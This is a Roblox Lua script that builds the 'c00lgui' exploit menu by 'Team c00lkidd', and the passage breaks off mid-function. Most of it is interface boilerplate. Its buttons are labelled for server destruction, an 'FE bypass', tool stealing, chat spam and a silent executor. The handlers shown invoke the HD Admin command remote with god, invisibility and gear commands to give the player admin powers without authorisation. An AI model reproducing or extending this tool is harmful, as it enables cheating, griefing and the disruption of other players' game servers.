-- Gui to Lua
-- Version: 3.2

-- Instances:

local si = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local Settings = Instance.new("Frame")
local SettingsButton = Instance.new("TextButton")
local Title_2 = Instance.new("TextLabel")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local Page1 = Instance.new("Frame")
local SkyboxDecalID = Instance.new("Frame")
local Title_3 = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local MusicID = Instance.new("Frame")
local Title_4 = Instance.new("TextLabel")
local TextBox_2 = Instance.new("TextBox")
local God = Instance.new("Frame")
local Title_5 = Instance.new("TextLabel")
local TextButton_5 = Instance.new("TextButton")
local Invisibility = Instance.new("Frame")
local Title_6 = Instance.new("TextLabel")
local TextButton_6 = Instance.new("TextButton")
local PageLabel = Instance.new("TextLabel")
local Save = Instance.new("TextButton")
local Load = Instance.new("TextButton")
local Page2 = Instance.new("Frame")
local BillboardGuiColor = Instance.new("Frame")
local Title_7 = Instance.new("TextLabel")
local TextBox2 = Instance.new("TextBox")
local TextBox1 = Instance.new("TextBox")
local TextBox3 = Instance.new("TextBox")
local PageLabel_2 = Instance.new("TextLabel")
local ChatSpamText = Instance.new("Frame")
local Title_8 = Instance.new("TextLabel")
local TextBox_3 = Instance.new("TextBox")
local WalkspeedAmount = Instance.new("Frame")
local Title_9 = Instance.new("TextLabel")
local TextBox_4 = Instance.new("TextBox")
local NameBox = Instance.new("Frame")
local Title_10 = Instance.new("TextLabel")
local TextBox_5 = Instance.new("TextBox")
local Page2_2 = Instance.new("Frame")
local WeaponScripts = Instance.new("Frame")
local xBow = Instance.new("TextButton")
local Title_11 = Instance.new("TextLabel")
local Drage = Instance.new("TextButton")
local Eyelaser = Instance.new("TextButton")
local Wand = Instance.new("TextButton")
local Knife = Instance.new("TextButton")
local Lightsaber = Instance.new("TextButton")
local AbyssalSword = Instance.new("TextButton")
local Staff = Instance.new("TextButton")
local TechnoGauntlet = Instance.new("TextButton")
local Plane = Instance.new("TextButton")
local Snowball = Instance.new("TextButton")
local SuicideVest = Instance.new("TextButton")
local DualBlades = Instance.new("TextButton")
local Titan = Instance.new("TextButton")
local Hammer = Instance.new("TextButton")
local GearTools = Instance.new("Frame")
local CustomGear = Instance.new("TextButton")
local Title_12 = Instance.new("TextLabel")
local StamperTools = Instance.new("TextButton")
local ToolStealer = Instance.new("TextButton")
local InsertTool = Instance.new("TextButton")
local Empty = Instance.new("TextButton")
local Gun = Instance.new("TextButton")
local DrawTool = Instance.new("TextButton")
local PageLabel_3 = Instance.new("TextLabel")
local Page1_2 = Instance.new("Frame")
local ServerDestruction = Instance.new("Frame")
local TextButton_7 = Instance.new("TextButton")
local Title_13 = Instance.new("TextLabel")
local TextButton_8 = Instance.new("TextButton")
local TextButton_9 = Instance.new("TextButton")
local TextButton_10 = Instance.new("TextButton")
local TextButton_11 = Instance.new("TextButton")
local TextButton_12 = Instance.new("TextButton")
local TextButton_13 = Instance.new("TextButton")
local TextButton_14 = Instance.new("TextButton")
local TextButton_15 = Instance.new("TextButton")
local TextButton_16 = Instance.new("TextButton")
local TextButton_17 = Instance.new("TextButton")
local TextButton_18 = Instance.new("TextButton")
local TextButton_19 = Instance.new("TextButton")
local TextButton_20 = Instance.new("TextButton")
local AdminCommandsGuis = Instance.new("Frame")
local FEBypass = Instance.new("TextButton")
local Title_14 = Instance.new("TextLabel")
local KohlsAdmin = Instance.new("TextButton")
local BTTConsole = Instance.new("TextButton")
local DZRSpawnItemGui = Instance.new("TextButton")
local KillGui = Instance.new("TextButton")
local SilentExecutor = Instance.new("TextButton")
local Nilizer = Instance.new("TextButton")
local RemsoAdmin = Instance.new("TextButton")
local Rek3k = Instance.new("TextButton")
local PageLabel_4 = Instance.new("TextLabel")
local Page4 = Instance.new("Frame")
local PresetSkyboxDecalIDs = Instance.new("Frame")
local Cat = Instance.new("TextButton")
local Title_15 = Instance.new("TextLabel")
local RC7 = Instance.new("TextButton")
local teamskrubl0rd = Instance.new("TextButton")
local PresetMusicIDs = Instance.new("Frame")
local Title_16 = Instance.new("TextLabel")
local Hijacked = Instance.new("TextButton")
local CyberChainsaw = Instance.new("TextButton")
local AllDropping8BitBeats = Instance.new("TextButton")
local NitroFunEasterEgg = Instance.new("TextButton")
local PageLabel_5 = Instance.new("TextLabel")
local Page3 = Instance.new("Frame")
local LocalPlayer = Instance.new("Frame")
local BillboardGui = Instance.new("TextButton")
local Title_17 = Instance.new("TextLabel")
local DiscoCharacter = Instance.new("TextButton")
local ChickenArms = Instance.new("TextButton")
local DominusGhost = Instance.new("TextButton")
local JD = Instance.new("TextButton")
local FloatingPad = Instance.new("TextButton")
local SetWalkspeed = Instance.new("TextButton")
local Heal = Instance.new("TextButton")
local ChangeName = Instance.new("TextButton")
local Misc = Instance.new("Frame")
local Title_18 = Instance.new("TextLabel")
local PlayMusic = Instance.new("TextButton")
local DiscoFog = Instance.new("TextButton")
local BecomeOwnerinPersonalServer = Instance.new("TextButton")
local LeaderstatChange = Instance.new("TextButton")
local PageLabel_6 = Instance.new("TextLabel")
local Page5 = Instance.new("Frame")
local PageLabel_7 = Instance.new("TextLabel")
local PageLabel_8 = Instance.new("TextLabel")
local PageLabel_9 = Instance.new("TextLabel")
local PageLabel_10 = Instance.new("TextLabel")
local PageLabel_11 = Instance.new("TextLabel")
local CloseOpen = Instance.new("TextButton")

--Properties:

si.Name = "si"
si.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
si.ResetOnSpawn = false

Frame.Parent = si
Frame.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Frame.BorderColor3 = Color3.fromRGB(255, 0, 4)
Frame.BorderSizePixel = 3
Frame.Position = UDim2.new(-0.00100000005, 3, 0.0790000036, 0)
Frame.Size = UDim2.new(0, 300, 0, 465)
Frame.ZIndex = 2

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title.BorderSizePixel = 3
Title.Position = UDim2.new(0, 0, 0.00214592274, 0)
Title.Size = UDim2.new(1, 0, 0.0139484983, 40)
Title.ZIndex = 2
Title.Font = Enum.Font.SourceSans
Title.Text = "c00lgui By Team c00lkidd"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 24.000
Title.TextWrapped = true

TextButton.Name = "<"
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton.BorderSizePixel = 3
TextButton.Position = UDim2.new(0, 0, 0, 40)
TextButton.Size = UDim2.new(0.5, 0, 0, 40)
TextButton.ZIndex = 2
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "<"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 48.000

TextButton_2.Name = ">"
TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_2.BorderSizePixel = 3
TextButton_2.Position = UDim2.new(0.5, 3, 0, 40)
TextButton_2.Size = UDim2.new(0.5, -3, 0, 40)
TextButton_2.ZIndex = 2
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = ">"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 48.000

Settings.Name = "Settings"
Settings.Parent = Frame
Settings.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Settings.BorderColor3 = Color3.fromRGB(255, 0, 0)
Settings.BorderSizePixel = 3
Settings.Position = UDim2.new(1, 3, 0, 0)
Settings.Size = UDim2.new(0, 300, 0, 465)

SettingsButton.Name = "SettingsButton"
SettingsButton.Parent = Settings
SettingsButton.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
SettingsButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
SettingsButton.BorderSizePixel = 3
SettingsButton.Position = UDim2.new(1, 3, 0, 0)
SettingsButton.Size = UDim2.new(0, 27, 1, 0)
SettingsButton.Font = Enum.Font.SourceSans
SettingsButton.Text = "<"
SettingsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SettingsButton.TextSize = 48.000

Title_2.Name = "Title"
Title_2.Parent = Settings
Title_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_2.BorderSizePixel = 3
Title_2.Size = UDim2.new(1, 0, 0, 40)
Title_2.Font = Enum.Font.SourceSans
Title_2.Text = "Settings"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextSize = 24.000

TextButton_3.Name = "<"
TextButton_3.Parent = Settings
TextButton_3.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_3.BorderSizePixel = 3
TextButton_3.Position = UDim2.new(0, 0, 0, 40)
TextButton_3.Size = UDim2.new(0.5, 0, 0, 40)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "<"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 48.000

TextButton_4.Name = ">"
TextButton_4.Parent = Settings
TextButton_4.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_4.BorderSizePixel = 3
TextButton_4.Position = UDim2.new(0.5, 3, 0, 40)
TextButton_4.Size = UDim2.new(0.5, -3, 0, 40)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = ">"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 48.000

Page1.Name = "Page1"
Page1.Parent = Settings
Page1.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Page1.BorderColor3 = Color3.fromRGB(255, 0, 0)
Page1.BorderSizePixel = 3
Page1.Position = UDim2.new(0, 0, 0, 83)
Page1.Size = UDim2.new(1, 0, 1, -83)
Page1.Visible = true

SkyboxDecalID.Name = "Skybox/Decal ID"
SkyboxDecalID.Parent = Page1
SkyboxDecalID.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
SkyboxDecalID.BorderColor3 = Color3.fromRGB(255, 0, 0)
SkyboxDecalID.BorderSizePixel = 3
SkyboxDecalID.Size = UDim2.new(0.5, 0, 0, 66)

Title_3.Name = "Title"
Title_3.Parent = SkyboxDecalID
Title_3.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_3.BorderSizePixel = 3
Title_3.Size = UDim2.new(1, 0, 0, 30)
Title_3.Font = Enum.Font.SourceSansBold
Title_3.Text = "Skybox/Decal ID (Maybe Working)"
Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_3.TextSize = 14.000
Title_3.TextWrapped = true

TextBox.Parent = SkyboxDecalID
TextBox.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextBox.BorderSizePixel = 3
TextBox.Position = UDim2.new(0, 0, 0.5, 0)
TextBox.Size = UDim2.new(1, 1, 0.5, -1)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "11924897469"
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000

MusicID.Name = "Music ID"
MusicID.Parent = Page1
MusicID.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
MusicID.BorderColor3 = Color3.fromRGB(255, 0, 0)
MusicID.BorderSizePixel = 3
MusicID.Position = UDim2.new(0, 150, 0, 0)
MusicID.Size = UDim2.new(0.49333322, 0, 0, 63)

Title_4.Name = "Title"
Title_4.Parent = MusicID
Title_4.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_4.BorderSizePixel = 3
Title_4.Position = UDim2.new(0, 0, 0.0476190485, 0)
Title_4.Size = UDim2.new(1, 0, 0, 30)
Title_4.Font = Enum.Font.SourceSansBold
Title_4.Text = "Music ID"
Title_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_4.TextSize = 14.000
Title_4.TextWrapped = true

TextBox_2.Parent = MusicID
TextBox_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextBox_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextBox_2.BorderSizePixel = 3
TextBox_2.Position = UDim2.new(0, 0, 0.5, 1)
TextBox_2.Size = UDim2.new(1, 0, 0.5, 0)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.Text = "6911766512"
TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.TextSize = 14.000

God.Name = "God"
God.Parent = Page1
God.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
God.BorderColor3 = Color3.fromRGB(255, 0, 0)
God.BorderSizePixel = 3
God.Position = UDim2.new(0, 2, 0, 69)
God.Size = UDim2.new(0.5, 0, 0, 63)

Title_5.Name = "Title"
Title_5.Parent = God
Title_5.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_5.BorderSizePixel = 3
Title_5.Size = UDim2.new(1, 0, 0, 30)
Title_5.Font = Enum.Font.SourceSansBold
Title_5.Text = "God (HD ADMIN)"
Title_5.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_5.TextSize = 14.000
Title_5.TextWrapped = true

TextButton_5.Parent = God
TextButton_5.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_5.BorderSizePixel = 3
TextButton_5.Position = UDim2.new(0, 0, 0.5, 0)
TextButton_5.Size = UDim2.new(1, 0, 0.5, 0)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Off"
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextSize = 14.000
TextButton_5.MouseButton1Down:connect(function()
	local args = {
		[1] = ";God Me "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Invisibility.Name = "Invisibility"
Invisibility.Parent = Page1
Invisibility.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Invisibility.BorderColor3 = Color3.fromRGB(255, 0, 0)
Invisibility.BorderSizePixel = 3
Invisibility.Position = UDim2.new(0.48999989, 3, -0.172774866, 132)
Invisibility.Size = UDim2.new(0.5, -3, 0, 63)

Title_6.Name = "Title"
Title_6.Parent = Invisibility
Title_6.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_6.BorderSizePixel = 3
Title_6.Position = UDim2.new(0, 0, 0.0158730168, 0)
Title_6.Size = UDim2.new(1, 0, 0, 30)
Title_6.Font = Enum.Font.SourceSansBold
Title_6.Text = "Invisibility"
Title_6.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_6.TextSize = 14.000
Title_6.TextWrapped = true

TextButton_6.Parent = Invisibility
TextButton_6.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_6.BorderSizePixel = 3
TextButton_6.Position = UDim2.new(0, 0, 0.5, 0)
TextButton_6.Size = UDim2.new(1, 0, 0.5, 0)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Off"
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextSize = 14.000
TextButton_6.MouseButton1Down:connect(function()
	local args = {
		[1] = ";Invisible Me "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

PageLabel.Name = "PageLabel"
PageLabel.Parent = Page1
PageLabel.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel.BorderSizePixel = 3
PageLabel.Position = UDim2.new(0, 0, 1, -52)
PageLabel.Size = UDim2.new(1, 0, 0, 29)
PageLabel.Font = Enum.Font.SourceSans
PageLabel.Text = "Page 1"
PageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel.TextSize = 18.000
PageLabel.TextWrapped = true

Save.Name = "Save"
Save.Parent = Settings
Save.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Save.BorderColor3 = Color3.fromRGB(255, 0, 0)
Save.BorderSizePixel = 4
Save.Position = UDim2.new(0, 0, 0.300000012, 260)
Save.Size = UDim2.new(0, 150, 0, 20)
Save.ZIndex = 2
Save.Selected = true
Save.Font = Enum.Font.SourceSans
Save.Text = "Save IDs"
Save.TextColor3 = Color3.fromRGB(255, 255, 255)
Save.TextSize = 18.000

Load.Name = "Load"
Load.Parent = Settings
Load.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Load.BorderColor3 = Color3.fromRGB(255, 0, 0)
Load.BorderSizePixel = 4
Load.Position = UDim2.new(0.5, 0, 0.300000012, 260)
Load.Size = UDim2.new(0, 150, 0, 20)
Load.ZIndex = 2
Load.Selected = true
Load.Font = Enum.Font.SourceSans
Load.Text = "Load IDs"
Load.TextColor3 = Color3.fromRGB(255, 255, 255)
Load.TextSize = 18.000

Page2.Name = "Page2"
Page2.Parent = Settings
Page2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Page2.BorderColor3 = Color3.fromRGB(255, 0, 0)
Page2.BorderSizePixel = 3
Page2.Position = UDim2.new(0, 0, 0, 83)
Page2.Size = UDim2.new(1, 0, 1, -83)
Page2.Visible = false

BillboardGuiColor.Name = "Billboard Gui Color"
BillboardGuiColor.Parent = Page2
BillboardGuiColor.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
BillboardGuiColor.BorderColor3 = Color3.fromRGB(255, 0, 0)
BillboardGuiColor.BorderSizePixel = 3
BillboardGuiColor.Size = UDim2.new(0.5, 0, 0, 66)

Title_7.Name = "Title"
Title_7.Parent = BillboardGuiColor
Title_7.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_7.BorderSizePixel = 3
Title_7.Size = UDim2.new(1, 0, 0, 30)
Title_7.Font = Enum.Font.SourceSansBold
Title_7.Text = "Billboard Gui Color"
Title_7.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_7.TextSize = 14.000
Title_7.TextWrapped = true

TextBox2.Name = "TextBox2"
TextBox2.Parent = BillboardGuiColor
TextBox2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextBox2.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextBox2.BorderSizePixel = 3
TextBox2.Position = UDim2.new(0, 50, 0.5, 0)
TextBox2.Size = UDim2.new(0, 50, 0.5, -1)
TextBox2.Font = Enum.Font.SourceSans
TextBox2.Text = "255"
TextBox2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox2.TextSize = 14.000

TextBox1.Name = "TextBox1"
TextBox1.Parent = BillboardGuiColor
TextBox1.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextBox1.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextBox1.BorderSizePixel = 3
TextBox1.Position = UDim2.new(0, 0, 0.5, 0)
TextBox1.Size = UDim2.new(0, 50, 0.5, -1)
TextBox1.Font = Enum.Font.SourceSans
TextBox1.Text = "0"
TextBox1.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox1.TextSize = 14.000

TextBox3.Name = "TextBox3"
TextBox3.Parent = BillboardGuiColor
TextBox3.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextBox3.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextBox3.BorderSizePixel = 3
TextBox3.Position = UDim2.new(0, 100, 0.5, 0)
TextBox3.Size = UDim2.new(0, 50, 0.5, -1)
TextBox3.Font = Enum.Font.SourceSans
TextBox3.Text = "0"
TextBox3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox3.TextSize = 14.000

PageLabel_2.Name = "PageLabel"
PageLabel_2.Parent = Page2
PageLabel_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_2.BorderSizePixel = 3
PageLabel_2.Position = UDim2.new(0, 0, 1, -53)
PageLabel_2.Size = UDim2.new(1, 0, 0, 30)
PageLabel_2.Font = Enum.Font.SourceSans
PageLabel_2.Text = "Page 2"
PageLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_2.TextSize = 18.000
PageLabel_2.TextWrapped = true

ChatSpamText.Name = "Chat Spam Text"
ChatSpamText.Parent = Page2
ChatSpamText.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
ChatSpamText.BorderColor3 = Color3.fromRGB(255, 0, 0)
ChatSpamText.BorderSizePixel = 3
ChatSpamText.Position = UDim2.new(0, 0, 0, 66)
ChatSpamText.Size = UDim2.new(0.5, -3, 0, 66)

Title_8.Name = "Title"
Title_8.Parent = ChatSpamText
Title_8.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_8.BorderSizePixel = 3
Title_8.Size = UDim2.new(1, 0, 0, 30)
Title_8.Font = Enum.Font.SourceSansBold
Title_8.Text = "Chat Spam Text"
Title_8.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_8.TextSize = 14.000
Title_8.TextWrapped = true

TextBox_3.Parent = ChatSpamText
TextBox_3.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextBox_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextBox_3.BorderSizePixel = 3
TextBox_3.Position = UDim2.new(0, 0, 0.5, 0)
TextBox_3.Size = UDim2.new(1, 0, 0.5, 0)
TextBox_3.Font = Enum.Font.SourceSans
TextBox_3.Text = "Join team c00lkidd!"
TextBox_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_3.TextSize = 14.000

WalkspeedAmount.Name = "Walkspeed Amount"
WalkspeedAmount.Parent = Page2
WalkspeedAmount.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
WalkspeedAmount.BorderColor3 = Color3.fromRGB(255, 0, 0)
WalkspeedAmount.BorderSizePixel = 3
WalkspeedAmount.Position = UDim2.new(0.48999989, 3, 0, 66)
WalkspeedAmount.Size = UDim2.new(0.5, 0, 0, 66)

Title_9.Name = "Title"
Title_9.Parent = WalkspeedAmount
Title_9.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_9.BorderSizePixel = 3
Title_9.Position = UDim2.new(0, 0, 0.0454545468, 0)
Title_9.Size = UDim2.new(1, 0, 0, 30)
Title_9.Font = Enum.Font.SourceSansBold
Title_9.Text = "Walkspeed Amount"
Title_9.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_9.TextSize = 14.000
Title_9.TextWrapped = true

TextBox_4.Parent = WalkspeedAmount
TextBox_4.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextBox_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextBox_4.BorderSizePixel = 2
TextBox_4.Position = UDim2.new(0, 0, 0.5, 0)
TextBox_4.Size = UDim2.new(1, 0, 0.545454562, -3)
TextBox_4.Font = Enum.Font.SourceSans
TextBox_4.Text = "50"
TextBox_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_4.TextSize = 14.000

NameBox.Name = "NameBox"
NameBox.Parent = Page2
NameBox.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
NameBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
NameBox.BorderSizePixel = 3
NameBox.Position = UDim2.new(0.5, 3, 0, 0)
NameBox.Size = UDim2.new(0.5, -3, 0, 66)

Title_10.Name = "Title"
Title_10.Parent = NameBox
Title_10.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_10.BorderSizePixel = 3
Title_10.Size = UDim2.new(1, 0, 0, 30)
Title_10.Font = Enum.Font.SourceSansBold
Title_10.Text = "Name"
Title_10.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_10.TextSize = 14.000
Title_10.TextWrapped = true

TextBox_5.Parent = NameBox
TextBox_5.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextBox_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextBox_5.BorderSizePixel = 3
TextBox_5.Position = UDim2.new(0, 0, 0.5, 0)
TextBox_5.Size = UDim2.new(1, 0, 0.5, 0)
TextBox_5.Font = Enum.Font.SourceSans
TextBox_5.Text = "God"
TextBox_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_5.TextSize = 14.000

Page2_2.Name = "Page2"
Page2_2.Parent = Frame
Page2_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Page2_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
Page2_2.BorderSizePixel = 3
Page2_2.Position = UDim2.new(0, 0, 0, 83)
Page2_2.Size = UDim2.new(1, 0, 1, -106)
Page2_2.Visible = false
Page2_2.ZIndex = 2

WeaponScripts.Name = "Weapon Scripts"
WeaponScripts.Parent = Page2_2
WeaponScripts.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
WeaponScripts.BorderColor3 = Color3.fromRGB(255, 0, 0)
WeaponScripts.BorderSizePixel = 3
WeaponScripts.Size = UDim2.new(0.5, 0, 1, 0)
WeaponScripts.ZIndex = 2

xBow.Name = "xBow"
xBow.Parent = WeaponScripts
xBow.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
xBow.BorderColor3 = Color3.fromRGB(255, 0, 0)
xBow.BorderSizePixel = 3
xBow.Position = UDim2.new(0, 0, 0, 33)
xBow.Size = UDim2.new(0.5, 0, 0, 30)
xBow.ZIndex = 2
xBow.Font = Enum.Font.SourceSans
xBow.Text = "Random Bow"
xBow.TextColor3 = Color3.fromRGB(255, 255, 255)
xBow.TextSize = 14.000
xBow.MouseButton1Down:connect(function()
	local args = {
	[1] = ";gear Me 121925044 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Title_11.Name = "Title"
Title_11.Parent = WeaponScripts
Title_11.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_11.BorderSizePixel = 3
Title_11.Size = UDim2.new(1, 0, 0, 30)
Title_11.ZIndex = 2
Title_11.Font = Enum.Font.SourceSansBold
Title_11.Text = "Weapon Scripts (Need HD ADMIN)"
Title_11.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_11.TextSize = 14.000
Title_11.TextWrapped = true

Drage.Name = "Drage"
Drage.Parent = WeaponScripts
Drage.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Drage.BorderColor3 = Color3.fromRGB(255, 0, 0)
Drage.BorderSizePixel = 3
Drage.Position = UDim2.new(0, 0, 0, 66)
Drage.Size = UDim2.new(0.5, 0, 0, 30)
Drage.ZIndex = 2
Drage.Font = Enum.Font.SourceSans
Drage.Text = "Attack Doge"
Drage.TextColor3 = Color3.fromRGB(255, 255, 255)
Drage.TextSize = 14.000
Drage.MouseButton1Down:connect(function()
local args = {
	[1] = ";gear Me 257810065 "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Eyelaser.Name = "Eyelaser"
Eyelaser.Parent = WeaponScripts
Eyelaser.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Eyelaser.BorderColor3 = Color3.fromRGB(255, 0, 0)
Eyelaser.BorderSizePixel = 3
Eyelaser.Position = UDim2.new(0, 0, 0, 99)
Eyelaser.Size = UDim2.new(0.5, 0, 0, 30)
Eyelaser.ZIndex = 2
Eyelaser.Font = Enum.Font.SourceSans
Eyelaser.Text = "Fingerlaser"
Eyelaser.TextColor3 = Color3.fromRGB(255, 255, 255)
Eyelaser.TextSize = 14.000
Eyelaser.MouseButton1Down:connect(function()
local args = {
	[1] = ";gear Me 115377964 "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)


Wand.Name = "Wand"
Wand.Parent = WeaponScripts
Wand.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Wand.BorderColor3 = Color3.fromRGB(255, 0, 0)
Wand.BorderSizePixel = 3
Wand.Position = UDim2.new(0.5, 3, 0, 33)
Wand.Size = UDim2.new(0.5, -3, 0, 30)
Wand.ZIndex = 2
Wand.Font = Enum.Font.SourceSans
Wand.Text = "Wand"
Wand.TextColor3 = Color3.fromRGB(255, 255, 255)
Wand.TextSize = 14.000
Wand.MouseButton1Down:connect(function()
local args = {
	[1] = ";gear Me 32355966 "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Knife.Name = "Knife"
Knife.Parent = WeaponScripts
Knife.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Knife.BorderColor3 = Color3.fromRGB(255, 0, 0)
Knife.BorderSizePixel = 3
Knife.Position = UDim2.new(0.5, 3, 0, 99)
Knife.Size = UDim2.new(0.5, -3, 0, 30)
Knife.ZIndex = 2
Knife.Font = Enum.Font.SourceSans
Knife.Text = "Knife"
Knife.TextColor3 = Color3.fromRGB(255, 255, 255)
Knife.TextSize = 14.000
Knife.MouseButton1Down:connect(function()
local args = {
